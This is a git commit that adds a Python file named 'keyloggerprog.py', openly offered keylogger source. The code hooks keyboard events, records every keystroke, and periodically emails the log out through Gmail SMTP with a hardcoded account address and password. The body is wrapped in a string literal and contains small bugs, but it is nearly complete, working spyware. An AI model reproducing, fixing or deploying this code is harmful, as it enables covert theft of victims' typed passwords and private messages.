cada3864fb28a1183a2a4328ca98d6ff0c82bc5d
Weedmastercrucifer <71014475+Weedmastercrucifer@users.noreply.github.com>
2020-10-25 12:22:38 +0530

    Add files via upload

---
+++ keyloggerprog.py
@@ -0,0 +1,52 @@
+# -*- coding: utf-8 -*-
+"""
+Created on Mon May 18 12:01:39 2020
+
+@author: Supratim
+"""
+'''
+import keyboard 
+import smtplib
+from threading import Semaphore, Timer 
+SEND_REPORT_EVERY= 180
+EMAIL_ADDRESS = "randomhuman699669@gmail.com" 
+EMAIL_PASSWORD ="holy#shit" 
+class Keylogger: 
+    def __init__(self, interval): 
+        self.interval = interval 
+        self.log="" 
+        self.semaphore = Semaphore(0) 
+    def callback(self, event):
+        name=event.name 
+        if len(name)>1 : 
+            if name=="space":
+                 name= " " 
+            elif name=="enter":
+                name="{enter}\n"
+            elif name=="decimal": 
+                name="." 
+            else : 
+                name=name.replace(" ", "_")
+                name= f"[{name.upper()}]"
+        self.log +=name 
+    def sendmail(self, email, password, message):
+        server= smtplib.SMTP(host="smtp.gmail.com", port=587) 
+        server.starttls()
+        server.login(email,password)
+        server.sendmail(email, email. message)
+        server.quit() 
+    def report(self):
+        if self.log:
+            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log) 
+        self.log= "" 
+        Timer(interval=self.interval, function=self.report).start 
+    def start(self):
+        keyboard.on_release(callback=self.callback)
+        self.report()
+        self.semaphore.acquire() 
+
+
+if __name__ == "__main__":
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
+    keylogger.start()
+     '''   
